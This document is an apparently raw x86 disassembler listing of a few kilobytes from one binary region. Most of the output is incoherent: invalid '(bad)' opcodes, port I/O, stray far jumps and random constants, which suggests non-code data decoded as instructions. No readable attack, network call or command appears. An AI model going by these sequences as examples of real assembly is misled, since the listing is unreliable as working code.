  41ca72:	add    BYTE PTR [eax],al
  41ca74:	lock retf 0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	aam    0xf7
  41ca82:	xchg   edi,eax
  41ca83:	out    dx,al
  41ca84:	lods   eax,DWORD PTR ds:[esi]
  41ca85:	xor    BYTE PTR [ecx],al
  41ca87:	add    BYTE PTR ds:0xf000001,al
  41ca8d:	or     al,0xa6
  41ca8f:	jmp    0x31975e95
  41ca94:	add    DWORD PTR [ebp+0x54],ecx
  41ca97:	push   ds
  41ca98:	(bad)  
  41ca9a:	test   al,0xc
  41ca9c:	sahf   
  41ca9d:	je     0x41cae8
  41ca9f:	push   cs
  41caa0:	lods   eax,DWORD PTR ds:[esi]
  41caa1:	dec    edx
  41caa2:	push   0xc7767e84
  41caa7:	xlat   BYTE PTR ds:[ebx]
  41caa8:	test   al,0xe7
  41caaa:	push   0x95baa7b1
  41caaf:	(bad)  
  41cab0:	mov    esi,0xc65f87ce
  41cab5:	scas   eax,DWORD PTR es:[edi]
  41cab6:	dec    ebx
  41cab7:	ret    
  41cab8:	and    ch,BYTE PTR [eax-0xa0f9400]
  41cabe:	rcr    BYTE PTR [ebp+0x2d442ecf],0xf8
  41cac5:	push   0xfffffffc
  41cac7:	lock iret 
  41cac9:	sub    bh,cl
  41cacb:	pop    eax
  41cacc:	ss test al,0xdf
  41cacf:	mov    al,ds:0xd876cefa
  41cad4:	xor    al,0xdd
  41cad6:	sbb    BYTE PTR [edi],cl
  41cad8:	jmp    FWORD PTR [ebx+0x66]
  41cadb:	xchg   edx,eax
  41cadc:	in     al,dx
  41cadd:	push   ss
  41cade:	aaa    
  41cadf:	jo     0x41caa6
  41cae1:	shr    BYTE PTR [ebx-0x2b84900e],1
  41cae7:	aaa    
  41cae8:	mov    ch,0x47
  41caea:	test   esp,ebx
  41caec:	jne    0x41cae2
  41caee:	mov    eax,0xe7ffe9ca
  41caf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41caf4:	sbb    BYTE PTR [ecx],bh
  41caf6:	push   ecx
  41caf7:	inc    ebp
  41caf8:	mov    ecx,0x6ed5d29c
  41cafd:	int3   
  41cafe:	xor    BYTE PTR [edi+0x19],ch
  41cb01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb02:	shl    BYTE PTR [esi],cl
  41cb04:	and    al,0x15
  41cb06:	jno    0x41caf7
  41cb08:	xor    eax,0xc3c30a38
  41cb0d:	and    DWORD PTR ds:[edx-0x628fb47e],ecx
  41cb14:	test   eax,0x3c0c2a4
  41cb19:	push   0xf8d38661
  41cb1e:	push   esp
  41cb1f:	pop    edi
  41cb20:	sub    al,0xf9
  41cb22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb23:	adc    esi,ebx
  41cb25:	mov    ebx,DWORD PTR [ebx]
  41cb27:	pop    ss
  41cb28:	fstp   DWORD PTR [ebx-0x2906d456]
  41cb2e:	mov    BYTE PTR [esi-0x40cf602b],0xd7
  41cb35:	push   eax
  41cb36:	mov    ebx,0x1e828907
  41cb3b:	sub    cl,bl
  41cb3d:	jmp    0x41cb5e
  41cb3f:	sbb    al,0x5c
  41cb41:	fmul   QWORD PTR [edi]
  41cb43:	adc    al,0x57
  41cb45:	jno    0x41cb1a
  41cb47:	in     al,dx
  41cb48:	cli    
  41cb49:	jl     0x41cbbb
  41cb4b:	sub    bh,bh
  41cb4d:	jne    0x41cb78
  41cb4f:	nop
  41cb50:	lea    eax,[ebx]
  41cb52:	cmp    eax,ecx
  41cb54:	mov    ecx,0xeb438f2a
  41cb59:	and    esi,DWORD PTR [esp+ebx*2+0x26bc60e6]
  41cb60:	and    al,0xfc
  41cb62:	xor    BYTE PTR [ebx+eax*8],cl
  41cb65:	ins    DWORD PTR es:[edi],dx
  41cb66:	inc    ecx
  41cb67:	cmp    DWORD PTR [esi-0x3e212aaa],esi
  41cb6d:	(bad)  
  41cb6f:	mov    WORD PTR [edx+0x1139dd7f],fs
  41cb75:	inc    edx
  41cb76:	pop    eax
  41cb77:	mov    eax,0xc05fa3f6
  41cb7c:	dec    ebx
  41cb7d:	leave  
  41cb7e:	add    eax,0x7591348f
  41cb83:	es mov dl,0x5a
  41cb86:	pop    ecx
  41cb87:	push   ds
  41cb88:	mov    ecx,0x5ea45f96
  41cb8d:	fs pusha 
  41cb8f:	cmc    
  41cb90:	adc    DWORD PTR [eax],eax
	...
  41cbf2:	add    BYTE PTR [eax],al
  41cbf4:	sub    esi,edx
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0xaabea622
  41cc03:	and    BYTE PTR [edx+0x5000131],dh
  41cc09:	add    DWORD PTR [eax],eax
  41cc0b:	add    bl,cl
  41cc0d:	mov    fs,WORD PTR [edi-0x69]
  41cc10:	loop   0x41cc34
  41cc12:	mov    DWORD PTR [ebp+0x4f0e349a],ebx
  41cc18:	jbe    0x41cbed
  41cc1a:	(bad)  
  41cc1c:	adc    ebp,DWORD PTR [ecx+edi*2+0x7015da51]
  41cc23:	cmp    DWORD PTR [ebp-0x5c],edx
  41cc26:	push   edi
  41cc27:	repnz into 
  41cc29:	fadd   st,st(6)
  41cc2b:	call   0x1d71:0x57403bc8
  41cc32:	fmul   st,st(1)
  41cc34:	(bad)  
  41cc35:	aad    0x68
  41cc37:	es inc ecx
  41cc39:	mov    ebp,0x3a6a3321
  41cc3e:	dec    ebp
  41cc3f:	xchg   esp,eax
  41cc40:	fcomi  st,st(6)
  41cc42:	mov    ds,WORD PTR [ebx]
  41cc44:	je     0x41cbf8
  41cc46:	jno    0x41cc0a
  41cc48:	popf   
  41cc49:	add    al,0x33
  41cc4b:	(bad)  
  41cc4d:	push   esi
  41cc4e:	idiv   DWORD PTR ds:0xdbb618ae
  41cc54:	cdq    
  41cc55:	mov    edx,DWORD PTR [eax+0x6d07145d]
  41cc5b:	cmp    al,BYTE PTR [ecx]
  41cc5d:	ret    0x4116
  41cc60:	in     al,dx
  41cc61:	sub    eax,0xe05121f2
  41cc66:	cmp    al,0x24
  41cc68:	and    DWORD PTR [edi+0x71],0xfffffffb
  41cc6c:	imul   esp,edi,0xc3e1e2f5
  41cc72:	sub    esp,esp
  41cc74:	and    DWORD PTR fs:[edi],ebp
  41cc77:	cdq    
  41cc78:	gs jno 0x41cca5
  41cc7b:	ret    
  41cc7c:	xor    ebx,DWORD PTR [eax-0x38]
  41cc7f:	aad    0xd
  41cc81:	(bad)  
  41cc82:	mov    DWORD PTR [ebx],ecx
  41cc84:	dec    ebx
  41cc85:	sbb    al,0x2a
  41cc87:	sbb    DWORD PTR [edi-0x3a],eax
  41cc8a:	sahf   
  41cc8b:	dec    ecx
  41cc8c:	in     al,0x5f
  41cc8e:	icebp  
  41cc8f:	mov    edx,edi
  41cc91:	inc    edx
  41cc92:	mov    dh,0x15
  41cc94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc95:	adc    BYTE PTR [ebx],bh
  41cc97:	xlat   BYTE PTR ds:[ebx]
  41cc98:	les    ebx,FWORD PTR [ebp+edx*1-0x6b]
  41cc9c:	adc    ecx,DWORD PTR [esi+0x6f]
  41cc9f:	jbe    0x41cd20
  41cca1:	retf   0xa571
  41cca4:	sahf   
  41cca5:	jns    0x41cc61
  41cca7:	or     al,BYTE PTR [eax+0x2d]
  41ccaa:	int    0x13
  41ccac:	ja     0x41cc90
  41ccae:	jg     0x41cc54
  41ccb0:	ins    BYTE PTR es:[edi],dx
  41ccb1:	xor    edx,DWORD PTR [esi+ebx*4-0x7d]
  41ccb5:	shr    BYTE PTR [edi-0x2a],0x56
  41ccb9:	in     al,0xb6
  41ccbb:	cwde   
  41ccbc:	jae    0x41cd19
  41ccbe:	push   esp
  41ccbf:	stos   DWORD PTR es:[edi],eax
  41ccc0:	aad    0xed
  41ccc2:	mov    cl,0x93
  41ccc4:	mov    al,ds:0x5477cced
  41ccc9:	add    cl,BYTE PTR [ebp+0x26]
  41cccc:	clc    
  41cccd:	iret   
  41ccce:	push   esi
  41cccf:	out    0xc1,al
  41ccd1:	fisub  DWORD PTR [ecx-0x4ab1358f]
  41ccd7:	mov    dl,0x13
  41ccd9:	mov    ebp,0x8b027128
  41ccde:	pop    eax
  41ccdf:	inc    ebp
  41cce0:	sar    BYTE PTR [esi-0x26],0xe3
  41cce4:	sbb    bh,BYTE PTR [esi+0x60184870]
  41ccea:	xor    dh,al
  41ccec:	mov    dl,0xc4
  41ccee:	xor    eax,0xf15c6ff9
  41ccf3:	clc    
  41ccf4:	or     BYTE PTR [ecx+edi*2],ch
  41ccf7:	mov    al,ds:0x13736a43
  41ccfc:	add    bh,BYTE PTR [eax-0xd9dea8e]
  41cd02:	sub    esi,DWORD PTR [edi+0x3123592c]
  41cd08:	push   edi
  41cd09:	jmp    0xb0b:0xa869d024
  41cd10:	xor    al,BYTE PTR [eax]
	...
  41cd72:	add    BYTE PTR [eax],al
  41cd74:	pusha  
  41cd75:	cdq    
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	jnp    0x41cd48
  41cd82:	inc    esi
  41cd83:	dec    ecx
  41cd84:	mov    bh,0x32
  41cd86:	add    DWORD PTR [eax],eax
  41cd88:	add    eax,0xf4000001
  41cd8d:	pop    ebp
  41cd8e:	jnp    0x41cd44
  41cd90:	ss push ebx
  41cd92:	mov    dl,0x28
  41cd94:	dec    esi
  41cd95:	aam    0x9b
  41cd97:	push   edi
  41cd98:	push   edx
  41cd99:	jle    0x41cd8e
  41cd9b:	mov    cl,0x32
  41cd9d:	repnz adc BYTE PTR [edx-0x7a],dl
  41cda1:	test   al,al
  41cda3:	fisttp QWORD PTR [esi]
  41cda5:	les    eax,FWORD PTR [edx]
  41cda7:	shl    ecx,0x3b
  41cdaa:	cwde   
  41cdab:	test   eax,0xddf6cfab
  41cdb0:	rol    DWORD PTR [eax-0x77],cl
  41cdb3:	mov    ds:0xb255fde7,al
  41cdb8:	scas   al,BYTE PTR es:[edi]
  41cdb9:	and    dh,ah
  41cdbb:	cmp    edi,DWORD PTR [ecx-0x7d]
  41cdbe:	mov    ah,0x1e
  41cdc0:	js     0x41cdcf
  41cdc2:	jge    0x41cdda
  41cdc4:	mov    dl,0xc2
  41cdc6:	adc    bl,BYTE PTR ds:0x356e93c4
  41cdcc:	xchg   ebx,eax
  41cdcd:	cmc    
  41cdce:	or     BYTE PTR [esi+esi*8-0x645e6c60],al
  41cdd5:	mov    eax,0x4a4b6d5d
  41cdda:	dec    edi
  41cddb:	and    DWORD PTR [ebp+0xe8d5c87],ecx
  41cde1:	inc    DWORD PTR [ecx-0xd]
  41cde4:	dec    ebx
  41cde5:	mov    ebp,DWORD PTR [esi-0xa161b05]
  41cdeb:	inc    edi
  41cdec:	adc    BYTE PTR ds:0x7d575c36,cl
  41cdf2:	dec    ebx
  41cdf3:	or     bh,BYTE PTR [ebp+0x39]
  41cdf6:	aas    
  41cdf7:	stc    
  41cdf8:	pusha  
  41cdf9:	adc    DWORD PTR [ecx-0x5a],edi
  41cdfc:	fwait
  41cdfd:	xchg   BYTE PTR [edi+esi*4],dl
  41ce00:	cmc    
  41ce01:	sar    BYTE PTR [edx],1
  41ce03:	call   0xc404:0x3b6f8c4b
  41ce0a:	jp     0x41ce06
  41ce0c:	std    
  41ce0d:	jl     0x41ce55
  41ce0f:	jecxz  0x41cde5
  41ce11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce12:	pushf  
  41ce13:	mov    ecx,0xa4a2d172
  41ce18:	jno    0x41ce09
  41ce1a:	outs   dx,BYTE PTR ds:[esi]
  41ce1b:	adc    bh,BYTE PTR [edx+0x257a4c]
  41ce21:	adc    al,cl
  41ce23:	ret    
  41ce24:	or     eax,0xcc4ef416
  41ce29:	sbb    al,0x2d
  41ce2b:	push   ecx
  41ce2c:	ret    0xf000
  41ce2f:	push   ecx
  41ce30:	and    ch,BYTE PTR [esi+0x4aa4bdb5]
  41ce36:	sub    eax,0xbabba00e
  41ce3b:	dec    esi
  41ce3c:	rcr    cl,0xc4
  41ce3f:	in     al,dx
  41ce40:	popa   
  41ce41:	pushf  
  41ce42:	or     al,BYTE PTR [ebp+0x13]
  41ce45:	and    ebx,ecx
  41ce47:	mov    ds:0x21acb606,eax
  41ce4c:	sbb    eax,0x7c8f6471
  41ce51:	inc    eax
  41ce52:	inc    ebp
  41ce53:	je     0x41ceca
  41ce55:	pop    ds
  41ce56:	xor    eax,0x76eed347
  41ce5b:	push   edi
  41ce5c:	mov    ebx,0x28807317
  41ce61:	xchg   ebx,eax
  41ce62:	cwde   
  41ce63:	sbb    eax,0xcfbf6ec6
  41ce68:	push   esp
  41ce69:	mov    bl,0x66
  41ce6b:	inc    esp
  41ce6c:	fcom   QWORD PTR [ebx-0x5a7d15eb]
  41ce72:	push   edi
  41ce73:	sub    DWORD PTR [eax-0x25],eax
  41ce76:	mov    bh,0xad
  41ce78:	repz xor bh,BYTE PTR [esp+edx*2]
  41ce7c:	in     al,dx
  41ce7d:	test   BYTE PTR [ecx-0x56],dl
  41ce80:	add    BYTE PTR [edi],bl
  41ce82:	sbb    eax,0x1b20735
  41ce87:	int    0x36
  41ce89:	jmp    0x41cefc
  41ce8b:	sar    ecx,1
  41ce8d:	test   eax,0x3367ed
	...
  41cef2:	add    BYTE PTR [eax],al
  41cef4:	pop    es
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	mov    esp,0xbc19aa2a
  41cf05:	xor    eax,DWORD PTR [ecx]
  41cf07:	add    BYTE PTR ds:0x3e000001,al
  41cf0d:	ins    BYTE PTR es:[edi],dx
  41cf0e:	cli    
  41cf0f:	(bad)  
  41cf10:	test   al,0xe8
  41cf12:	mov    esp,0xf30649e2
  41cf17:	(bad)  
  41cf18:	cmc    
  41cf19:	cs mov ebx,0xc249d0c0
  41cf1f:	cmp    ebx,esp
  41cf21:	rcr    DWORD PTR [esi+ecx*4],0x48
  41cf25:	je     0x41cf55
  41cf27:	mov    ebx,0xa95cf91b
  41cf2c:	fs xchg edx,eax
  41cf2e:	neg    DWORD PTR [ebp-0x758141df]
  41cf34:	mov    esi,0xe0ff82e8
  41cf39:	imul   ebx,DWORD PTR [edi-0x7c],0x668a8cc2
  41cf40:	fstp   TBYTE PTR [edi]
  41cf42:	dec    edi
  41cf43:	sar    DWORD PTR [edx],1
  41cf45:	sbb    ch,BYTE PTR [edi-0x3a]
  41cf48:	ja     0x41cedc
  41cf4a:	outs   dx,BYTE PTR ds:[esi]
  41cf4b:	xor    esp,DWORD PTR [ecx-0x3f912484]
  41cf51:	cdq    
  41cf52:	pop    esi
  41cf53:	lods   eax,DWORD PTR ds:[esi]
  41cf54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf55:	scas   eax,DWORD PTR es:[edi]
  41cf56:	add    al,0x6e
  41cf58:	mov    edx,esi
  41cf5a:	sar    ch,cl
  41cf5c:	mov    ch,0x5f
  41cf5e:	and    BYTE PTR [edi-0x746794d8],ch
  41cf64:	cwde   
  41cf65:	je     0x41cfa9
  41cf67:	out    0xd0,eax
  41cf69:	mov    ebx,0x1ab9e496
  41cf6e:	xor    BYTE PTR [eax-0x45],ah
  41cf71:	fstp   st(6)
  41cf73:	cwde   
  41cf74:	ds int 0x25
  41cf77:	cmp    esi,DWORD PTR [ebp+0x2c]
  41cf7a:	sbb    bl,ch
  41cf7c:	cmc    
  41cf7d:	hlt    
  41cf7e:	or     BYTE PTR [edx],0xef
  41cf81:	test   DWORD PTR [edi-0x32],ebx
  41cf84:	mov    ebp,0xab4510ec
  41cf89:	mov    bl,0x25
  41cf8b:	mov    edx,0x2c9dea7
  41cf90:	xchg   esi,eax
  41cf91:	cmc    
  41cf92:	test   eax,0x1686ce8a
  41cf97:	jmp    0x41cf91
  41cf99:	out    0xcf,eax
  41cf9b:	xadd   esp,edi
  41cf9e:	and    BYTE PTR [ecx-0x9],al
  41cfa1:	mov    bh,0xd5
  41cfa3:	out    dx,eax
  41cfa4:	dec    edx
  41cfa5:	repz adc BYTE PTR cs:[edx],0x99
  41cfaa:	js     0x41d011
  41cfac:	adc    esi,0x5e
  41cfaf:	pop    ebx
  41cfb0:	fnstsw WORD PTR [esi+0x24]
  41cfb3:	gs mov eax,0xd911032b
  41cfb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfba:	cmp    DWORD PTR ds:0xad4ed77e,ebp
  41cfc0:	add    ecx,DWORD PTR [eax+0x1ffdecb5]
  41cfc6:	sar    BYTE PTR [eax-0x1e],0xc4
  41cfca:	and    BYTE PTR [edx+eax*4-0x38],0x2d
  41cfcf:	inc    edx
  41cfd0:	cli    
  41cfd1:	leave  
  41cfd2:	xor    edx,esp
  41cfd4:	xor    al,0x72
  41cfd6:	arpl   WORD PTR [esp+edx*1-0x30],bp
  41cfda:	push   esp
  41cfdb:	jae    0x41cff8
  41cfdd:	jl     0x41cfc2
  41cfdf:	or     esp,edi
  41cfe1:	mov    edi,0xf8def555
  41cfe6:	cmp    BYTE PTR [eax-0x38],bh
  41cfe9:	es mov edi,0x5b670fb5
  41cfef:	(bad)  
  41cff0:	mov    bl,0x66
  41cff2:	lock mov dh,0x54
  41cff5:	dec    edi
  41cff6:	repnz mov eax,0x87e7c5f6
  41cffc:	in     eax,dx
  41cffd:	fsubp  st(7),st
  41cfff:	push   ebx
  41d000:	fsub   DWORD PTR [edi]
  41d002:	(bad)  
  41d003:	lahf   
  41d004:	xor    BYTE PTR [ebx-0x35908d21],bl
  41d00a:	or     BYTE PTR [edx+0x5ebdf237],bl
  41d010:	mov    al,0x0
	...
  41d072:	add    BYTE PTR [eax],al
  41d074:	mov    ecx,0xad432034
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0x9b123ebd
  41d083:	aas    
  41d084:	shl    DWORD PTR [ecx+eax*1],0x0
  41d088:	add    eax,0x52000001
  41d08d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d08e:	jecxz  0x41d0a1
  41d090:	sub    ebp,DWORD PTR [edi-0x7]
  41d093:	fsub   QWORD PTR [eax-0x1e]
  41d096:	push   edi
  41d097:	shl    BYTE PTR [eax],cl
  41d099:	xchg   ecx,eax
  41d09a:	aad    0x2d
  41d09c:	mov    ds,WORD PTR [esi+0xb10baba]
  41d0a2:	stos   DWORD PTR es:[edi],eax
  41d0a3:	and    edi,DWORD PTR [ebp+eax*2-0x26599c63]
  41d0aa:	jmp    0xcf1e083b
  41d0af:	mov    cs,eax
  41d0b1:	js     0x41d0ea
  41d0b3:	adc    eax,0xb872ad90
  41d0b8:	jg     0x41d0ae
  41d0ba:	repnz test DWORD PTR [esi+0x6b],ebp
  41d0be:	add    ecx,ebp
  41d0c0:	pop    ds
  41d0c1:	ins    DWORD PTR es:[edi],dx
  41d0c2:	adc    ecx,0xffffffc8
  41d0c5:	push   0x4e
  41d0c7:	fiadd  WORD PTR [eax]
  41d0c9:	pop    ss
  41d0ca:	icebp  
  41d0cb:	fimul  WORD PTR [eax+0x442120ab]
  41d0d1:	pop    es
  41d0d2:	call   0xb15319fa
  41d0d7:	out    0x76,al
  41d0d9:	sbb    bh,0x5f
  41d0dc:	mov    edx,0x21769014
  41d0e1:	aad    0x9a
  41d0e3:	mov    ebx,0x4babd42b
  41d0e8:	xchg   BYTE PTR [ecx-0x4f],cl
  41d0eb:	lahf   
  41d0ec:	xchg   esp,eax
  41d0ed:	jge    0x41d083
  41d0ef:	in     eax,0x82
  41d0f1:	xchg   edx,eax
  41d0f2:	out    0xa2,al
  41d0f4:	xchg   edx,eax
  41d0f5:	mov    ebx,0x139dd7a6
  41d0fa:	jecxz  0x41d143
  41d0fc:	data16 xor BYTE PTR [eax*8+0x622c1ec1],ch
  41d104:	xor    bh,cl
  41d106:	jbe    0x41d11f
  41d108:	sub    DWORD PTR [eax-0x7cf957d6],0x9bd5ad24
  41d112:	out    0x9b,eax
  41d114:	(bad)  
  41d115:	popf   
  41d116:	(bad)  
  41d117:	bound  ecx,QWORD PTR es:[esi]
  41d11a:	mov    ebp,0x4a277a7e
  41d11f:	or     DWORD PTR [ebx],0xcb5faf7d
  41d125:	das    
  41d126:	daa    
  41d127:	jmp    0x85e3:0x9ba571e9
  41d12e:	cld    
  41d12f:	sbb    DWORD PTR ds:0x9496f7cc,ebx
  41d135:	(bad)  
  41d136:	test   DWORD PTR [eax+0x59],edi
  41d139:	xchg   esp,eax
  41d13a:	(bad)  
  41d13b:	jae    0x41d1b6
  41d13d:	push   0x11cacdf5
  41d142:	call   0x1584f103
  41d147:	and    DWORD PTR [ecx],eax
  41d149:	lock es int3 
  41d14c:	stos   DWORD PTR es:[edi],eax
  41d14d:	or     ecx,esp
  41d14f:	test   DWORD PTR [eax-0x4191b87e],ecx
  41d155:	mov    ds:0x337b4249,al
  41d15a:	stos   BYTE PTR es:[edi],al
  41d15b:	xor    eax,0x34210907
  41d160:	jb     0x41d17b
  41d162:	push   edx
  41d163:	les    esp,FWORD PTR [edi]
  41d165:	std    
  41d166:	mov    edi,0xcf439b25
  41d16b:	jecxz  0x41d1cd
  41d16d:	shl    ecx,cl
  41d16f:	add    ebx,0x52
  41d172:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d173:	dec    esp
  41d174:	jnp    0x41d1e9
  41d176:	xlat   BYTE PTR ds:[ebx]
  41d177:	cmc    
  41d178:	mov    edi,0xf37ea10e
  41d17d:	mov    ds:0xc1c4e4a6,al
  41d182:	push   0xdb7dbd20
  41d187:	jns    0x41d1a3
  41d189:	xchg   edi,eax
  41d18a:	sub    esp,DWORD PTR [eax]
  41d18c:	cmp    al,0xc5
  41d18e:	in     al,0xcf
  41d190:	push   esi
	...
  41d1f1:	add    BYTE PTR [eax],al
  41d1f3:	add    BYTE PTR [eax-0x3d],dl
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	or     BYTE PTR [ebp+0x35c6b90d],bl
  41d206:	add    DWORD PTR [eax],eax
  41d208:	add    eax,0x4000001
  41d20d:	(bad)  
  41d20e:	out    dx,eax
  41d20f:	sub    bh,ah
  41d211:	sub    dl,dh
  41d213:	(bad)  
  41d214:	fdiv   DWORD PTR [edx]
  41d216:	mov    al,0x8b
  41d218:	test   al,0xce
  41d21a:	arpl   WORD PTR [ecx-0x50117a75],bx
  41d220:	rcr    BYTE PTR [edi-0x61a834bf],cl
  41d226:	(bad)  
  41d227:	mov    edi,0x76755665
  41d22c:	call   0xe93469ed
  41d231:	xchg   ebp,eax
  41d232:	sbb    al,0x4b
  41d234:	repnz fadd DWORD PTR [esi-0x6c3546dc]
  41d23b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d23c:	mov    ebx,0x545b9b42
  41d241:	arpl   WORD PTR [edi],di
  41d243:	mov    ch,0x2e
  41d245:	fwait
  41d246:	jno    0x41d21c
  41d248:	fucomi st,st(3)
  41d24a:	ret    
  41d24b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d24c:	les    esp,FWORD PTR [eax-0x79ac0774]
  41d252:	xchg   ebp,eax
  41d253:	rol    BYTE PTR [ecx-0xf417fb6],cl
  41d259:	ss sub al,0x17
  41d25c:	int3   
  41d25d:	push   cs
  41d25e:	or     BYTE PTR [ecx],0x6
  41d261:	mov    ebp,ebp
  41d263:	mov    ebx,0x6ac84d72
  41d268:	nop
  41d269:	inc    edx
  41d26a:	jmp    0x5416:0x57b2b4b2
  41d271:	pusha  
  41d272:	pop    eax
  41d273:	out    0x6a,al
  41d275:	mov    cl,0x8e
  41d277:	jecxz  0x41d20c
  41d279:	lods   al,BYTE PTR ds:[esi]
  41d27a:	icebp  
  41d27b:	push   esp
  41d27c:	cmp    al,0xfe
  41d27e:	imul   esi,ebp,0x7571720a
  41d284:	adc    eax,0xb6eda4a5
  41d289:	mov    DWORD PTR [ebp+0x3f0ed5c1],0xac028d94
  41d293:	adc    cl,ah
  41d295:	cmp    dh,BYTE PTR [edx+0x561f1415]
  41d29b:	cdq    
  41d29c:	push   edi
  41d29d:	outs   dx,DWORD PTR ds:[esi]
  41d29e:	in     al,0xe8
  41d2a0:	inc    edi
  41d2a1:	mov    bh,0x9d
  41d2a3:	addr16 push ebx
  41d2a5:	and    ch,bl
  41d2a7:	pop    edx
  41d2a8:	lods   eax,DWORD PTR ds:[esi]
  41d2a9:	lahf   
  41d2aa:	(bad)  [esi]
  41d2ac:	mov    ebx,0x59f03072
  41d2b1:	(bad)  
  41d2b2:	xor    edx,ebx
  41d2b4:	or     esi,DWORD PTR [ebx-0x79488b23]
  41d2ba:	inc    ecx
  41d2bb:	scas   al,BYTE PTR es:[edi]
  41d2bc:	cwde   
  41d2bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2be:	lock jl 0x41d281
  41d2c1:	(bad)  
  41d2c2:	call   0xe65b129d
  41d2c7:	int    0xbe
  41d2c9:	pop    DWORD PTR [ebp+0x2f9acf54]
  41d2cf:	fbstp  TBYTE PTR ds:0xc26e3c37
  41d2d5:	mov    ecx,0x580a03c
  41d2da:	sbb    edx,ebx
  41d2dc:	sub    al,0x8
  41d2de:	mov    edx,0xb4693b79
  41d2e3:	cwde   
  41d2e4:	and    cl,BYTE PTR [edi]
  41d2e6:	push   cs
  41d2e7:	dec    esp
  41d2e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2e9:	es mov esi,0xb2d6f395
  41d2ef:	sbb    DWORD PTR [ebp-0xb4d4b08],esp
  41d2f5:	es pop edi
  41d2f7:	cmp    esp,eax
  41d2f9:	adc    dh,BYTE PTR [edi]
  41d2fb:	sbb    al,0x4b
  41d2fd:	stc    
  41d2fe:	cdq    
  41d2ff:	dec    edx
  41d300:	pop    eax
  41d301:	leave  
  41d302:	inc    ebp
  41d303:	ret    
  41d304:	sbb    eax,0x83578b82
  41d309:	repnz out dx,al
  41d30b:	sub    edx,0xcf6e8834
	...
  41d371:	add    BYTE PTR [eax],al
  41d373:	add    dh,bh
  41d375:	cmp    cl,0x54
  41d378:	(bad)  
  41d379:	jge    0x41d37a
  41d37b:	stos   BYTE PTR es:[edi],al
  41d37c:	lea    ebp,[edi]
  41d37e:	shr    BYTE PTR [ecx-0x44],0xe3
  41d382:	lahf   
  41d383:	sub    eax,0x136cb
  41d388:	add    eax,0xf2000001
  41d38d:	dec    ebx
  41d38e:	pop    edi
  41d38f:	cmp    BYTE PTR [ebp+0x72],bl
  41d392:	enter  0x6f27,0xc0
  41d396:	(bad)  
  41d397:	xchg   edx,eax
  41d398:	mov    al,0xf9
  41d39a:	dec    edi
  41d39b:	mov    ebp,0xc4ee107b
  41d3a0:	jb     0x41d3d4
  41d3a2:	xchg   ebx,eax
  41d3a3:	inc    esp
  41d3a4:	dec    edx
  41d3a5:	inc    esi
  41d3a6:	sub    ecx,ebp
  41d3a8:	(bad)  
  41d3a9:	ffreep st(7)
  41d3ab:	bound  edx,QWORD PTR [ecx+0xb9cf1fb]
  41d3b1:	and    DWORD PTR [edx+0x319b34f9],ebx
  41d3b7:	adc    BYTE PTR es:[edx-0x663fd289],0x4f
  41d3bf:	outs   dx,DWORD PTR ds:[esi]
  41d3c0:	xchg   ebp,eax
  41d3c1:	nop
  41d3c2:	dec    esi
  41d3c3:	test   eax,0xe67fdc12
  41d3c8:	add    al,0xba
  41d3ca:	mov    al,0xd7
  41d3cc:	jle    0x41d406
  41d3ce:	cmc    
  41d3cf:	inc    eax
  41d3d0:	jmp    0x41d3c9
  41d3d2:	inc    ebx
  41d3d3:	push   ebp
  41d3d4:	mov    ch,BYTE PTR [edx-0x1d0ce601]
  41d3da:	and    esp,DWORD PTR [ebx]
  41d3dc:	and    al,0xe1
  41d3de:	mov    ebx,0xd05de776
  41d3e3:	ret    0xb1d0
  41d3e6:	pusha  
  41d3e7:	and    eax,0xd385fe89
  41d3ec:	mov    ebp,0x86c6d372
  41d3f1:	push   ebx
  41d3f2:	leave  
  41d3f3:	pusha  
  41d3f4:	test   BYTE PTR [ebp+edx*4-0x5982f0fe],ch
  41d3fb:	push   esi
  41d3fc:	outs   dx,DWORD PTR ds:[esi]
  41d3fd:	mov    ebp,0x6d1c91bd
  41d402:	sbb    dl,ch
  41d404:	and    cl,BYTE PTR [eax-0x49]
  41d407:	scas   al,BYTE PTR es:[edi]
  41d408:	sbb    edi,DWORD PTR [ecx+0x30]
  41d40b:	push   0xe8ac8cde
  41d410:	add    dh,BYTE PTR [edi-0x3bf2e0cb]
  41d416:	lods   eax,DWORD PTR ds:[esi]
  41d417:	arpl   WORD PTR [ebx],si
  41d419:	bound  edi,QWORD PTR ds:0x775d07a9
  41d41f:	xchg   bl,dh
  41d421:	xor    eax,0xebe45c34
  41d426:	or     eax,0xdb4edc30
  41d42b:	in     al,0x49
  41d42d:	jnp    0x41d479
  41d42f:	jmp    0x41d435
  41d431:	dec    esp
  41d432:	imul   esi,DWORD PTR [esi-0xd82bfb0],0x37c3be36
  41d43c:	pop    es
  41d43d:	fadd   DWORD PTR [ecx]
